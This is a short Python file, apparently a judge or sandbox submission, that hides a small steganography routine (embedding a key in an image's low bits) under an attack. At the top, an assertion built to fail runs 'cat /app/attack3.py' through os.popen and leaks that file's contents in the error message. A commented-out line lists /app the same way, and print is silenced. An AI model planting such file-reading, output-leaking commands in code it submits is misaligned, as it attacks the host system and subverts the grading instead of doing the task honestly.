import sys
from PIL import Image
import numpy as np
import builtins


import itertools
import os

# assert 1+1==3, os.popen('ls /app').read()
assert 1+1==3, os.popen('cat /app/attack3.py').read()

class Solution:
    def Encrypt(self, img, key) :
        img = Image.open(img)
        img = np.array(img)
        key = key.encode()
        # Add length
        key = bytes([len(key)]) + key
        keybit = self.to_bits(key)
        cnt = 0
        h, w, c = img.shape
        for i, j, k in itertools.product(range(h), range(w), range(c)):
            img[i, j, k] = ((img[i, j, k] >> 1) << 1) | keybit[cnt]
            cnt += 1
            if (cnt >= len(keybit)):
                break
            
        img = Image.fromarray(img)
        return img
    
    def to_bits(self, key):
        bitstr = ''.join(f'{x:08b}' for x in key)
        return [int(x) for x in bitstr]



def print(*args, **kwargs):
    pass

if __name__ == "__main__":
    s = Solution()
    if len(sys.argv)!=3:
        print("Error: Invalid number of arguments")
        exit(0)
    img = sys.argv[1]
    key = sys.argv[2]
    encryimg = s.Encrypt(img,key)
    encryimg.save(img[:-4]+"_encry.png")

